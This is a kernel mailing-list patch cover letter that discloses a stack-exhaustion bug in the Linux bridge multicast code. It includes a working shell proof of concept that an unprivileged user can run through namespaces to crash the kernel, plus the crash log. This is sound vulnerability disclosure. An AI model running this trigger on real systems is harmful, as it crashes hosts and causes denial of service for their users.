Received: from mail-pj2-f42.google.com (mail-pj2-f42.google.com [74.125.227.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7F1CE377ABC
	for <bridge@lists.linux.dev>; Sat, 26 Sep 2026 17:04:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790442296; cv=none; b=Y6PbYPIzx+zaxi2ZRO5ygzBZEpUWfqD/a1bpOM6OI3PtRehYNld/0HPldqC/vHXE24w7NIEr/Y5wx9G1VfBzw98FtRpmWI8HNBSN1N/s2N9lei/TcDRU4U6eFcHEHlXrHrs/4SbOCRSdk6kB+Pl2DfO5CsfOrdOVTAe+mCUosDM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790442296; c=relaxed/simple;
	bh=8GDsVP00mp5etgWkkDl0HA4JTYURgwDPfw1eiDXzsFs=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UK6ns0qOBH4d1KQ16ByoyKGyDqFJ4M/Y3ZPXq9ElbYbjHFY/4ro67yb7wQX01QK0XTQBSSOojhG+GW6QhRZsKYjGNfkNnPgiuuWKWZPwCjtZqVfRdCxfdWMFwFNlEnuseAKmBmYQEn4sBD1+cleEQE23zbVpZ4uFjWUT8JIrJsM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=glb6fbqY; arc=none smtp.client-ip=74.125.227.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="glb6fbqY"
Received: by mail-pj2-f42.google.com with SMTP id d9443c01a7336-2ddaa08c890so7695395ad.0
        for <bridge@lists.linux.dev>; Sat, 26 Sep 2026 10:04:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790442293; x=1791047093; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=x9CP1vZ9dA2dGgejpR++/G/uCOUN0Gkch+94h5Qw+54=;
        b=glb6fbqYTQbR1XUJxuNPYZfA0+ppRtARwB5exmU52/WeeZqsuP/G9jJhiMwCI4qeru
         fs+UEtOLl9i5hpk21bMR4kHnwt7taZnStHu4yTPDiVfTd8lBRVfNZw5wFe3tNODalIVz
         K1UDEakoA+zv+ptHueC21SwCIS8xbVBLUtdkgnSvfqL1PVbkRdh+/VrDlkcmAACCAIGQ
         p50W6eb/M5vmyuetywH/HItnHIcYenLDVjJoAosg+BwAeJ/2iDYz811x4dix4qBen5zK
         TNlCYvZSZbGq0WfIy838gPeBF5IkA66giZzmhXiqtl3MXFUa2lXLwIXg6jELLS4Hemu4
         8U3g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790442293; x=1791047093;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=x9CP1vZ9dA2dGgejpR++/G/uCOUN0Gkch+94h5Qw+54=;
        b=GXv8d+9wDqj+kM46McSTflu8dXtLnDD3Z3Ix33xeMwXJdsa9Uqc4Z+/8AT45eOp7aA
         Abyk855w7uogw85dCfP9RMemP5zteXDTUgbkpZuUp/l49EOI7XYIst2BMvNs/FmwFk23
         SY+7eMNrek9Xg0HGEMf+5JkY8+gV5qyZ2/kAxE4Z0/6Z2oZtoTHtOyIkN2tTNO2kGDE3
         Y7PtpqboqGHGJ4iHimQAO6oGQkfna3Q7BC/zabhxrYiZ0IAZxn+P6NFoOs2z3XcWSbw/
         cf16nTgPejzc3utALtbH3oxYD6siNbgiAJdFhWtwlOijRhMFxZKjWVyFrUlisGukKMa6
         WFkA==
X-Gm-Message-State: AFq9FYKopM9XRj42OJAxD9RLAilOuWzgRS+U1nXpK3CzRNc4EG75jGSW
	U+2rTCJtmloPWaJUryRmTtkHRwTJKgbggBWnLo4vKz5bDa3mJaaR9bPdYTbKLbRci4QEZTfJbHF
	KVe98i9mG
X-Gm-Gg: AYBFou3GBsPDb8uP4BppbmuOjYUJUt2pvdHI9YLTs8OvWrPGRtjZmVYdgrW7MCGgkzV
	eubu/Ey4mhuJi12CdjvOjTSYSAwyRBa1ENvjMW8GCighkOHOfxmfOX6Ip2cjaaJskkqHHrym3Jv
	DO/ELrrogAxgI30nfdOdrRpMgy6g/Kzv/vrLkb82Pb1qwHz31YX9cg4wvwUwppwErpT3egP0SD4
	LjymNKP0Bj76QvtcL6WK4KE9FHq/dEPyP+/1Viud6CrHNsL5xcMWxTZ189ikp4QEhmKaaHmUNkR
	3bPau7mRvWkdKjztfYi8QqiMxUS4G+7xvoTAVUq596iGHt1A0iLQ2hoXdg22Umxo4eEE058Jsez
	qHn0+MlfLq4Yl4E8dhuSA0aHASreIEPs8x2U3pqu08vmkLMeN8/Ft72jPJ2HBI6utzpw8zvoR1r
	YNb09iyvWHfGIQAEANweWbjQ2t4sINusm/3HZqrCxdegJ+LgJPWVBGd+Bn2wcHbpG0QGOVK6BJf
	zIDYxpW
X-Received: by 2002:a17:903:184c:b0:2df:3b0c:a6a5 with SMTP id d9443c01a7336-2df7da5d1bemr81030935ad.9.1790442292345;
        Sat, 26 Sep 2026 10:04:52 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc78791c072sm2540444a12.15.2026.09.26.10.04.43
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 26 Sep 2026 10:04:51 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: bridge@lists.linux.dev,
	netdev@vger.kernel.org
Cc: razor@blackwall.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net: bridge: avoid recursive multicast cleanup
Date: Sun, 27 Sep 2026 01:04:38 +0800
Message-ID: <cover.1790323012.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: bridge@lists.linux.dev
List-Id: <bridge.lists.linux.dev>
List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/bridge/br_multicast.c. The bug is
reachable by a non-root user via user and network namespaces. We've tested
it, and it should not affect any other bridge multicast functionality.

This bug is tracked at: https://bugtracker.nebusec.ai/f/4342

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

When an EXCLUDE (*,G) port is deleted, br_multicast_star_g_handle_mode()
removes its corresponding temporary STAR_EXCL (S,G) port. For an (S,G)
entry, br_multicast_del_pg() then calls
br_multicast_sg_del_exclude_ports() to remove the remaining automatically
added ports. That helper also calls br_multicast_del_pg() for each port,
which re-enters the same cleanup and adds another stack frame per port.
With enough ports, the task hits the kernel stack guard page.

The new internal deletion helper takes a flag controlling this follow-up
cleanup. br_multicast_sg_del_exclude_ports() uses it with the follow-up
disabled while walking the same entry; ordinary deletion callers retain
the existing behavior.

Reproducer:

Run the attached shell PoC as a non-root guest user with iproute2 bridge
MDB filter-mode support:

    sh poc.sh --namespace

The PoC uses unshare -Urn, creates 256 temporary EXCLUDE ports and a
permanent INCLUDE source entry with IGMPv3 enabled, then deletes one
EXCLUDE port.

------BEGIN poc.sh------

#!/bin/sh

set -eu
PATH=/usr/sbin:/usr/bin:/sbin:/bin:$PATH

N="${N:-256}"
BR="${BR:-br0}"
GROUP="${GROUP:-239.1.1.1}"
SOURCE="${SOURCE:-10.0.0.1}"
INC_PORT="${INC_PORT:-e0}"

need_cmd() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "missing command: $1" >&2
		exit 1
	}
}

cleanup() {
	ip link del "$BR" 2>/dev/null || true
	ip link del "$INC_PORT" 2>/dev/null || true

	i=1
	while [ "$i" -le "$N" ]; do
		ip link del "e$i" 2>/dev/null || true
		i=$((i + 1))
	done
}

run_inner() {
	need_cmd ip
	need_cmd bridge

	sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1 || true

	cleanup

	echo "[*] building bridge with $N temporary STAR_EXCL candidates" >&2
	ip link add "$BR" type bridge mcast_snooping 1 mcast_igmp_version 3
	ip link set "$BR" up

	i=1
	while [ "$i" -le "$N" ]; do
		ip link add "e$i" type dummy
		ip link set "e$i" master "$BR"
		ip link set "e$i" up
		i=$((i + 1))
	done

	ip link add "$INC_PORT" type dummy
	ip link set "$INC_PORT" master "$BR"
	ip link set "$INC_PORT" up

	echo "[*] installing (*,G) EXCLUDE ports" >&2
	i=1
	while [ "$i" -le "$N" ]; do
		bridge mdb add dev "$BR" port "e$i" grp "$GROUP" temp \
			filter_mode exclude
		i=$((i + 1))
	done

	echo "[*] installing the permanent (*,G) INCLUDE source that seeds the shared (S,G)" >&2
	bridge mdb add dev "$BR" port "$INC_PORT" grp "$GROUP" permanent \
		filter_mode include source_list "$SOURCE"

	echo "[*] deleting one EXCLUDE port; this recursively tears down every STAR_EXCL S,G port" >&2
	bridge mdb del dev "$BR" port e1 grp "$GROUP"
}

if [ "${1:-}" = "--inner" ]; then
	shift
	run_inner "$@"
	exit 0
fi

if [ "${1:-}" = "--namespace" ]; then
	shift
	exec unshare -Urn -- "$0" --inner "$@"
fi

run_inner "$@"

------END poc.sh--------

----BEGIN crash log----

[  989.150962][    C1] BUG: TASK stack guard page was hit at ffa000000ef8ffd8 (stack is ffa000000ef90000..ffa000000ef98000)
[  989.150999][    C1] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
[  989.152881][    C1] CPU: 1 UID: 1001 PID: 14739 Comm: bridge Not tainted 7.3.0-rc4-g11536ee3d3e0 #1 PREEMPT(full) 
[  989.153997][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  989.154886][    C1] RIP: 0010:__lock_acquire+0xd2/0x2110
[  989.155441][    C1] Code: 2f 00 00 8b 0c 24 44 8b 5c 24 08 48 85 c0 44 8b 44 24 10 49 89 c7 0f 84 bc 04 00 00 41 8b 86 a0 0b 00 00 44 8b 0d ae 80 ab 19 <89> 04 24 45 85 c9 75 09 83 f8 2f 0f 87 a9 0a 00 00 49 81 ef a0 7d
[  989.157307][    C1] RSP: 0018:ffa000000ef8ffe8 EFLAGS: 00010046
[  989.157915][    C1] RAX: 0000000000000002 RBX: 0000000000000000 RCX: 0000000000000002
[  989.158672][    C1] RDX: 0000000000000000 RSI: ffffffff9b483d80 RDI: ffffffff8e9ebbe0
[  989.159407][    C1] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[  989.160149][    C1] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
[  989.160892][    C1] R13: ffffffff8e9ebbe0 R14: ff11000027c24c40 R15: ffffffff963f8318
[  989.161636][    C1] FS:  00000000232d63c0(0000) GS:ff110000d5775000(0000) knlGS:0000000000000000
[  989.162460][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  989.163077][    C1] CR2: ffa000000ef8ffd8 CR3: 0000000053bcc000 CR4: 0000000000753ef0
[  989.163813][    C1] PKRU: 55555554
[  989.164150][    C1] Call Trace:
[  989.164467][    C1]  <TASK>
[  989.164750][    C1]  lock_acquire+0x1bf/0x370
[  989.165183][    C1]  ? unwind_next_frame+0xbf/0x2300
[  989.165676][    C1]  unwind_next_frame+0xd3/0x2300
[  989.166144][    C1]  ? unwind_next_frame+0xbf/0x2300
[  989.166616][    C1]  ? __unwind_start+0x585/0x810
[  989.167062][    C1]  ? get_stack_info_noinstr+0x18/0x120
[  989.167571][    C1]  __unwind_start+0x50a/0x810
[  989.168010][    C1]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[  989.168578][    C1]  arch_stack_walk+0x62/0xf0
[  989.169005][    C1]  ? __unwind_start+0x585/0x810
[  989.169453][    C1]  stack_trace_save+0x8e/0xc0
[  989.169890][    C1]  ? __pfx_stack_trace_save+0x10/0x10
[  989.170366][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.170865][    C1]  ? kernel_text_address+0x11/0x90
[  989.171333][    C1]  ? __kernel_text_address+0xd/0x40
[  989.171797][    C1]  ? unwind_get_return_address+0x59/0xa0
[  989.172298][    C1]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[  989.172847][    C1]  kasan_save_stack+0x24/0x50
[  989.173271][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.173766][    C1]  ? stack_trace_save+0x8e/0xc0
[  989.174202][    C1]  ? ref_tracker_alloc+0x172/0x590
[  989.174661][    C1]  ? stack_depot_save_flags+0x2d/0xa40
[  989.175147][    C1]  ? ref_tracker_alloc+0x172/0x590
[  989.175608][    C1]  ? set_track_prepare+0x3d/0x70
[  989.176047][    C1]  ? ref_tracker_alloc+0x172/0x590
[  989.176502][    C1]  ? switchdev_deferred_enqueue+0x139/0x2b0
[  989.177028][    C1]  ? switchdev_port_obj_del+0xfb/0x160
[  989.177512][    C1]  ? br_switchdev_mdb_notify+0x173/0x3b0
[  989.178014][    C1]  ? __br_mdb_notify+0x578/0x810
[  989.178459][    C1]  ? br_multicast_del_pg+0x24f/0x1da0
[  989.178944][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.179436][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.179920][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.180409][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.180901][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.181390][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.181891][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.182383][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.182870][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.183361][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.183853][    C1]  ? ___slab_alloc+0x27a/0x830
[  989.184286][    C1]  ? rcu_is_watching+0x13/0xc0
[  989.184720][    C1]  kasan_save_track+0x14/0x30
[  989.185140][    C1]  __kasan_kmalloc+0xaa/0xb0
[  989.185550][    C1]  __kmalloc_cache_noprof+0x2da/0x6e0
[  989.186034][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.186522][    C1]  ? ref_tracker_alloc+0x172/0x590
[  989.186977][    C1]  ref_tracker_alloc+0x172/0x590
[  989.187417][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.187906][    C1]  ? __pfx_ref_tracker_alloc+0x10/0x10
[  989.188392][    C1]  ? br_multicast_del_pg+0x166f/0x1da0
[  989.188881][    C1]  ? rcu_is_watching+0x13/0xc0
[  989.189314][    C1]  ? trace_kmalloc+0xda/0x110
[  989.189743][    C1]  ? __kasan_kmalloc+0xaa/0xb0
[  989.190169][    C1]  ? __kmalloc_noprof+0x376/0x810
[  989.190626][    C1]  ? switchdev_deferred_enqueue+0x33/0x2b0
[  989.191144][    C1]  ? __pfx_switchdev_port_obj_del_deferred+0x10/0x10
[  989.191733][    C1]  switchdev_deferred_enqueue+0x139/0x2b0
[  989.192235][    C1]  switchdev_port_obj_del+0xfb/0x160
[  989.192709][    C1]  br_switchdev_mdb_notify+0x173/0x3b0
[  989.193201][    C1]  ? __pfx_br_switchdev_mdb_notify+0x10/0x10
[  989.193742][    C1]  __br_mdb_notify+0x578/0x810
[  989.194171][    C1]  ? arch_irq_work_raise+0x4f/0x70
[  989.194633][    C1]  br_multicast_del_pg+0x24f/0x1da0
[  989.195108][    C1]  ? find_held_lock+0x2b/0x80
[  989.195534][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.196010][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.196484][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.196957][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.197432][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.197925][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.198400][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.198879][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.199351][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.199820][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.200287][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.200757][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.201229][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.201697][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.202172][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.202651][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.203128][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.203609][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.204090][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.204565][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.205048][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.205522][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.206000][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.206481][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.206958][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.207441][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.207920][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.208397][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.208877][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.209366][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.209845][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.210328][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.210802][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.211285][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.211759][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.212240][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.212719][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.213202][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.213689][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.214163][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.214640][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.215122][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.215602][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.216085][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.216568][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.217043][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.217526][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.218009][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.218493][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.218969][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.219446][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.219924][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.220403][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.220879][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.221360][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.221845][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.222324][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.222805][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.223285][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.223770][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.224247][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.224729][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.225201][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.225687][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.226162][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.226645][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.227122][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.227605][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.228089][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.228572][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.229055][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.229537][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.230024][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.230506][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.230988][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.231465][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.231937][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.232411][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.232884][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.233363][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.233843][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.234323][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.234795][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.235278][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.235757][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.236241][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.236719][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.237198][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.237676][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.238156][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.238639][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.239123][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.239604][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.240087][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.240570][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.241051][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.241533][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.242012][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.242494][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.242980][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.243461][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.243938][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.244419][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.244896][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.245370][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.245855][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.246340][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.246822][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.247300][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.247781][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.248261][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.248745][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.249217][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.249698][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.250182][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.250671][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.251152][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.251632][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.252111][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.252592][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.253069][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.253549][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.254025][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.254507][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.254991][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.255475][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.255952][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.256436][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.256913][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.257390][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.257873][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.258351][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.258831][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.259316][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.259794][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.260272][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.260750][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.261231][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.261713][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.262186][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.262664][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.263139][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.263622][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.264097][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.264571][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.265050][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.265532][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.266019][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.266500][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.266978][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.267462][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.267947][    C1]  br_multicast_del_pg+0x166f/0x1da0
[  989.268426][    C1]  br_multicast_find_del_pg.part.0+0x12c/0x180
[  989.268975][    C1]  br_multicast_star_g_handle_mode+0x503/0xb60
[  989.269525][    C1]  ? __pfx_br_multicast_star_g_handle_mode+0x10/0x10
[  989.270121][    C1]  ? skb_put+0x138/0x1b0
[  989.270510][    C1]  ? __br_mdb_notify+0x54d/0x810
[  989.270960][    C1]  ? br_multicast_del_pg+0x342/0x1da0
[  989.271448][    C1]  br_multicast_del_pg+0x342/0x1da0
[  989.271917][    C1]  ? br_mdb_ip_get+0x62f/0xbe0
[  989.272353][    C1]  __br_mdb_del+0x40a/0x6d0
[  989.272762][    C1]  ? __pfx___br_mdb_del+0x10/0x10
[  989.273218][    C1]  br_mdb_del+0x2ae/0x4c0
[  989.273612][    C1]  ? __pfx_br_mdb_del+0x10/0x10
[  989.274054][    C1]  ? __mutex_lock+0x27a/0x1d90
[  989.274488][    C1]  ? __nla_parse+0x42/0x60
[  989.274894][    C1]  ? __pfx_br_mdb_del+0x10/0x10
[  989.275328][    C1]  rtnl_mdb_del+0x296/0x6a0
[  989.275742][    C1]  ? __pfx_rtnl_mdb_del+0x10/0x10
[  989.276194][    C1]  ? __pfx_rtnl_mdb_del+0x10/0x10
[  989.276642][    C1]  rtnetlink_rcv_msg+0x3cd/0xfa0
[  989.277088][    C1]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  989.277569][    C1]  ? __lock_acquire+0x509/0x2110
[  989.278011][    C1]  netlink_rcv_skb+0x147/0x430
[  989.278443][    C1]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
[  989.278924][    C1]  ? __pfx_netlink_rcv_skb+0x10/0x10
[  989.279394][    C1]  ? netlink_deliver_tap+0x1ae/0xd10
[  989.279872][    C1]  netlink_unicast+0x58d/0x850
[  989.280302][    C1]  ? __pfx_netlink_unicast+0x10/0x10
[  989.280767][    C1]  ? __pfx_sock_has_perm+0x10/0x10
[  989.281225][    C1]  netlink_sendmsg+0x88d/0xd90
[  989.281658][    C1]  ? __pfx_netlink_sendmsg+0x10/0x10
[  989.282121][    C1]  ? selinux_socket_sendmsg+0x18f/0x2e0
[  989.282616][    C1]  ? __pfx_netlink_sendmsg+0x10/0x10
[  989.283085][    C1]  ____sys_sendmsg+0xa27/0xb90
[  989.283516][    C1]  ? __pfx_____sys_sendmsg+0x10/0x10
[  989.283988][    C1]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[  989.284508][    C1]  ? __pfx_____sys_recvmsg+0x10/0x10
[  989.284978][    C1]  ? copy_msghdr_from_user+0xfb/0x150
[  989.285457][    C1]  ___sys_sendmsg+0x11c/0x1b0
[  989.285877][    C1]  ? __pfx____sys_sendmsg+0x10/0x10
[  989.286337][    C1]  ? ___sys_recvmsg+0x110/0x190
